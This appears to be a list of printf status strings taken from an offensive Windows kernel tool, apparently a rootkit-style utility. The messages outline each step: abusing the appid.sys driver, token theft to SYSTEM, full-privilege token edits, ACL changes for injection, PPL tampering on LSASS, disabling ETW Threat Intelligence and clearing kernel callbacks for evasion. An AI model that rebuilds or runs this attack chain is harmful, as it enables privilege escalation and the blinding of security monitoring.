			""\nChoose payload:\n"""
		""\nPPL Protection Signers:\n"""
"printf(
"printf(""[!] Disabling PPL on target process (Disabling PPL on LSASS in Windows 11 causes a reboot if not restored within a minute)\n"");"
"printf(""[!] ETW IsEnabled byte addr may be wrong, ETW_GUID_ENTRY->TRACE_ENABLE_INFO is %llx\n"", (isenabled & 0xFF));"
"printf(""[!] It is possible to set privilege fields to -1 to gain all privileges, but it will look anomalous\n"");"
"printf(""[!] Note the ACL offset is only confirmed valid for winlogon.exe, other processes may be different\n"");"
"printf(""[!] Note: A BSOD is likely if the target process closes while the token is in use\n"");"
"printf(""[*] Adding %llx offset, EtwThreatIntProvRegHandle is: %llx\n"", readKeApcQueueFunc, ntEtwThreatIntProvRegHandleAddr);"
"printf(""[*] Adding %x offset, PsSetLoadImageNotifyRoutineEx is: %llx\n"", readPspDllCallback, PsSetLoadImageNotifyRoutineEx);"
"printf(""[*] Adding %x offset, PspSetCreateProcessNotifyRoutine is: %llx\n"", readPspProcCallback, PspSetCreateProcessNotifyRoutine);"
"printf(""[*] Adding %x offset, PspSetCreateThreadNotifyRoutine is: %llx\n"", readPspThreadCallback, PspSetCreateThreadNotifyRoutine);"
"printf(""[*] All DLL image load callbacks cleared!\n"");"
"printf(""[*] All process callbacks cleared!\n"");"
"printf(""[*] All thread callbacks cleared!\n"");"
"printf(""[*] Base address of ntoskrnl.exe: 0x%llx\n"", ntosBase);"
"printf(""[*] Base address of ntoskrnl: 0x%llx\n"", (ULONGLONG)ntosbase);"
"printf(""[*] Calling IOCTL to exploit callback overwrite with nt!ExpProfileDelete\n"");"
"printf(""[*] Editing ACL to allow access to target PID: %d\n"", targetPid);"
"printf(""[*] Elevating to SYSTEM token\n"");"
"printf(""[*] Escalating privileges for target PID: %d\n"", targetPid);"
"printf(""[*] Exiting\n"");"
"printf(""[*] Kernel pointer to KeInsertQueueApc: %llx\n"", KeInsertQueueApcAddr);"
"printf(""[*] Kernel pointer to KeInsertQueueApc: 0x%llx\n"", KeInsertQueueApcAddr);"
"printf(""[*] Kernel pointer to PsInitialSystemProcess: 0x%llx\n"", systemProcessPtr);"
"printf(""[*] Kernel pointer to PsSetCreateProcessNotifyRoutine: %llx\n"", ProcCallbackAddr);"
"printf(""[*] Kernel pointer to PsSetCreateProcessNotifyRoutine: 0x%llx\n"", ProcCallbackAddr);"
"printf(""[*] Kernel pointer to PsSetCreateThreadNotifyRoutine: %llx\n"", ThreadCallbackAddr);"
"printf(""[*] Kernel pointer to PsSetCreateThreadNotifyRoutine: 0x%llx\n"", ThreadCallbackAddr);"
"printf(""[*] Kernel pointer to PsSetLoadImageNotifyRoutine: %llx\n"", DllCallbackAddr);"
"printf(""[*] Kernel pointer to PsSetLoadImageNotifyRoutine: 0x%llx\n"", DllCallbackAddr);"
"printf(""[*] Kernel pointer to SYSTEM process: %llx\n"", systemProcessAddr);"
"printf(""[*] Not running as NT AUTHORITY\\LOCAL SERVICE\n"");"
"printf(""[*] Opened file handle: 0x%x\n"", (DWORD)eaFile);"
"printf(""[*] Opened thread handle to self: 0x%x\n"", (DWORD)myhThread);"
"printf(""[*] Restored previous mode to user mode. Cleaning up and exiting\n"");"
"printf(""[*] Stealing target process token and starting cmd.exe\n"");"
"printf(""[*] Stealing token from target PID: %x\n"", targetPid);"
"printf(""[*] Targeting self\n"");"
"printf(""[+] Current process found at: %llx\n"", iterProc);"
"printf(""[+] ETW_REG_ENTRY located at %llx\n"", ntEtwThreatIntProvRegHandle);"
"printf(""[+] First DLL image load callback at: %llx\n"", callbackaddr);"
"printf(""[+] First process creation callback at: %llx\n"", callbackaddr);"
"printf(""[+] First thread creation callback at: %llx\n"", callbackaddr);"
"printf(""[+] Found kernel mode address of nt!ExpProfileDelete: 0x%llx\n"", kExpProfileDelete);"
"printf(""[+] Found likely jump offset at: %llx, value %llx\n"", (((ULONGLONG)DllCallbackAddr) + pspoffset), readPspDllCallback);"
"printf(""[+] Found likely jump offset at: %llx, value %llx\n"", (((ULONGLONG)KeInsertQueueApcAddr) + apcoffset), readKeApcQueueFunc);"
"printf(""[+] Found likely jump offset at: %llx, value %llx\n"", (((ULONGLONG)ProcCallbackAddr) + pspoffset), readPspProcCallback);"
"printf(""[+] Found likely jump offset at: %llx, value %llx\n"", (((ULONGLONG)ThreadCallbackAddr) + pspoffset), readPspThreadCallback);"
"printf(""[+] Found likely jump offset at: %llx, value %llx\n"", (PsSetLoadImageNotifyRoutineEx + pspoffset - 4), potentialPspCallback);"
"printf(""[+] Found likely jump offset at: %llx, value %llx\n"", (PspSetCreateProcessNotifyRoutine + pspoffset - 4), potentialPspCallback);"
"printf(""[+] Found likely jump offset at: %llx, value %llx\n"", (PspSetCreateThreadNotifyRoutine + pspoffset - 4), potentialPspCallback);"
"printf(""[+] Impersonated NT AUTHORITY\\LOCAL SERVICE\n"");"
"printf(""[+] Impersonated NT AUTHORITY\\SYSTEM\n"");"
"printf(""[+] Leaked KTHREAD for current process: 0x%llx\n"", (ULONGLONG)curKthread);"
"printf(""[+] Leaked kernel file object: 0x%llx\n"", (ULONGLONG)kEaFile);"
"printf(""[+] Loaded ntoskrnl at 0x%llx\n"", (ULONGLONG)umodeNtoskrnl);"
"printf(""[+] NULLing callback at %llx, with value %llx\n"", callbackaddr, callbacks);"
"printf(""[+] Obtained driver handle: 0x%llx\n"", (ULONGLONG)hDriver);"
"printf(""[+] Opened full access handle 0x%x to PID: %d\n"", hTPid, targetPid);"
"printf(""[+] Opened handle to appid.sys driver\n"");"
"printf(""[+] Previous mode has been set to kernel mode. RW primitives active\n"");"
"printf(""[+] Reading Security Descriptor to find ACL address\n"");"
"printf(""[+] Reading isenabled byte from etwGuidEntry+0x80 (%llx + 0x80)\n"", etwGuidEntry);"
"printf(""[+] SeDebugPrivilege enabled\n"");"
"printf(""[+] Setting ETW IsEnabled byte to 0x0\n"");"
"printf(""[+] Setting MandatoryPolicy byte at %llx to 0\n"", MandatorySecurityPolicy);"
"printf(""[+] Setting SEP_AUDIT_POLICY to 0x%llx, previous mask: 0x%llx\n"", newaudit, SEPAUDIT);"
"printf(""[+] Setting SEP_TOKEN_PRIVILEGES to 0x%llx, previous privilege mask: 0x%llx\n"", newtoken, SEPTOKEN);"
"printf(""[+] Target process found at: %llx\n"", iterProc);"
"printf(""[+] Updating ACL at %llx to give access to \""Authenticated Users\"" group (S-1-5-11)\n"", targetACLPtr);"
"printf(""[-] AdjustTokenPrivileges Failed With Error: %d \n"", GetLastError());"
"printf(""[-] Allocating memory for input buffer failed\n"");"
"printf(""[-] Allocating memory for output buffer failed\n"");"
"printf(""[-] Calling IOCTL failed: 0x%lx\n"", GetLastError());"
"printf(""[-] Could not find KeInsertQueueApc in ntoskrnl\n"");"
"printf(""[-] Could not find PsInitialSystemProcess in ntoskrnl\n"");"
"printf(""[-] Could not find PsSetCreateProcessNotifyRoutine in ntoskrnl\n"");"
"printf(""[-] Could not find PsSetCreateThreadNotifyRoutine in ntoskrnl\n"");"
"printf(""[-] Could not find PsSetLoadImageNotifyRoutine in ntoskrnl\n"");"
"printf(""[-] Could not find offset to EtwThreatIntProvRegHandle within 50 instructions, exiting\n"");"
"printf(""[-] Could not find offset to PsSetLoadImageNotifyRoutineEx within 50 instructions, exiting\n"");"
"printf(""[-] Could not find offset to PspSetCreateProcessNotifyRoutine within 50 instructions, exiting\n"");"
"printf(""[-] Could not find offset to PspSetCreateThreadNotifyRoutine within 50 instructions, exiting\n"");"
"printf(""[-] Could not find offset to process creation callbacks within 150 instructions, exiting\n"");"
"printf(""[-] Could not find offset to thread creation callbacks within 150 instructions, exiting\n"");"
"printf(""[-] Could not find target PS_PROTECTION struct in kernel.\n"");"
"printf(""[-] Could not find target process in kernel.\n"");"
"printf(""[-] Could not find tokens in kernel. Current process: %llx  Target process: %llx\n"", curTokenPtr, targetACLPtr);"
"printf(""[-] Could not find tokens in kernel. Current process: %llx  Target process: %llx\n"", curTokenPtr, targetToken);"
"printf(""[-] Could not obtain handle to Appid.sys with token, trying again\n"");"
"printf(""[-] Could not resolve nt!ExpProfileDelete in usermode\n"");"
"printf(""[-] Could not retrieve base addr of ntoskrnl\n"");"
"printf(""[-] EnumDeviceDrivers failed with error: 0x%lx\n"", GetLastError());"
"printf(""[-] Error loading ntoskrnl: 0x%lx\n"", GetLastError());"
"printf(""[-] Error obtaining driver handle: 0x%lx\n"", GetLastError());"
"printf(""[-] Error while calling ReadProcessMemory(): %d\n"", GetLastError());"
"printf(""[-] Error while loading ntoskrnl: %d\n"", GetLastError());"
"printf(""[-] Failed to create temporary file: %ls\n"", fName);"
"printf(""[-] Failed to obtain process token\n"");"
"printf(""[-] Failed to set previous mode\n"");"
"printf(""[-] Failed to steal LOCAL SERVICE token, exiting\n"");"
"printf(""[-] Failed to steal SYSTEM token, exiting\n"");"
"printf(""[-] GetProcAddress failed\n"");"
"printf(""[-] GetTokenInformation failed with error: 0x%x\n"", GetLastError());"
"printf(""[-] ImpersonateLoggedOnUser Failed with Error: %lx\n"", GetLastError());"
"printf(""[-] LocalAlloc [%d] Failed With Error: %d \n"", __LINE__, GetLastError());"
"printf(""[-] LookupAccountSidW Failed With Error: %d\n"", GetLastError());"
"printf(""[-] LookupPrivilegeValueW Failed With Error: %d \n"", GetLastError());"
"printf(""[-] Not All Privileges Referenced Are Assigned To The Caller \n"");"
"printf(""[-] NtQuerySystemInformation failed with error code 0x%X\n"", status);"
"printf(""[-] NtWriteVirtualMemory failed with status 0x%x\n"", status);"
"printf(""[-] OpenProcess PID %d Failed with Error: %lx\n"", Pid, GetLastError());"
"printf(""[-] OpenProcess targeting PID %d has failed\n"", targetPid);"
"printf(""[-] OpenProcessToken Failed With Error: 0x%0.8X \n"", GetLastError());"
"printf(""[-] OpenProcessToken PID %d Failed with Error: 0x%lx\n"", Pid, GetLastError());"
"printf(""[-] OpenThread to self failed\n"");"
"printf(""[-] Unable to find RVA of ExpProfileDelete function\n"");"
"printf(""[DEBUG] Adding offset %x and jump %llx to address %llx\n"", pspoffset, (potentialPspCallback & 0xFFFFFFFF), PsSetLoadImageNotifyRoutineEx);"
"printf(""[DEBUG] Adding offset %x and jump %llx to address %llx\n"", pspoffset, (potentialPspCallback & 0xFFFFFFFF), PspSetCreateProcessNotifyRoutine);"
"printf(""[DEBUG] Adding offset %x and jump %llx to address %llx\n"", pspoffset, (potentialPspCallback & 0xFFFFFFFF), PspSetCreateThreadNotifyRoutine);"
"printf(""[DEBUG] Hitting breakpoint\n"");  Sleep(1000); DebugBreak();;"
"printf(""[DEBUG] Starting address of ExpProfileDelete: 0x%llx\n"", lpFoundAddress);"
"printf(""[DEBUG] current: %llx from offset +0x%x\n"", readPspDllCallback, pspoffset);"
"printf(""[DEBUG] current: %llx from offset +0x%x\n"", readPspProcCallback, pspoffset);"
"printf(""[DEBUG] current: %llx from offset +0x%x\n"", readPspThreadCallback, pspoffset);"
"printf(""[DEBUG] rkStruct->KeInsertQueueApc:	0x%llx\n"", rkStruct->KeInsertQueueApc);"
"printf(""[DEBUG] rkStruct->PsSetCreateProcessNotifyRoutine: 0x%llx\n"", rkStruct->PsSetCreateProcessNotifyRoutine);"
"printf(""[DEBUG] rkStruct->PsSetCreateThreadNotifyRoutine: 0x%llx\n"", rkStruct->PsSetCreateThreadNotifyRoutine);"
"printf(""[DEBUG] rkStruct->PsSetLoadImageNotifyRoutine: 0x%llx\n"", rkStruct->PsSetLoadImageNotifyRoutine);"
"printf(""[DEBUG] rkStruct->myProcessId: 0x%x\n"", rkStruct->myProcessId);"
"printf(""[DEBUG] rkStruct->readprimitive: 0x%p\n"", rkStruct->readprimitive);"
"printf(""[DEBUG] rkStruct->systemEprocess: 0x%llx\n"", rkStruct->systemEprocess);"
"printf(""[DEBUG] rkStruct->vulnDriver: 0x%x\n"", (int)rkStruct->vulnDriver);"
"printf(""[DEBUG] rkStruct->writeprimitive: 0x%p\n"", rkStruct->writeprimitive);"
"printf(""[EVASION] Clearing kernel callbacks for image loads\n"");"
"printf(""[EVASION] Clearing kernel callbacks for process creation\n"");"
"printf(""[EVASION] Clearing kernel callbacks for thread creation\n"");"
"printf(""[EVASION] Disabling ETW Threat Intel (function hooking in kernel)\n"");"
"printf(""[EVASION] Enabling PPL for PID %d\n"", option2);"
"printf(""[INJECTION] Editing ACL to inject into PID %d\n"", option2);"
"printf(""[PRIVESC] Giving token full privileges for PID %d\n"", option2);"
"printf(""[PRIVESC] Stealing token from PID %d\n"", option2);"
"printf(""\n""); // just for spacing"
"printf(""\n[+] Setting protection level to %llx\n"", (protectionLevel & 0xFF));"
"printf(""\n[-] Invalid PID format\n"");"
"printf(L""[*] Current token user: %s\n"", curTokenUser);"
"printf(L""[+] Obtained token for %s from PID %d\n"", targetTokenUser, pe32.th32ProcessID);"
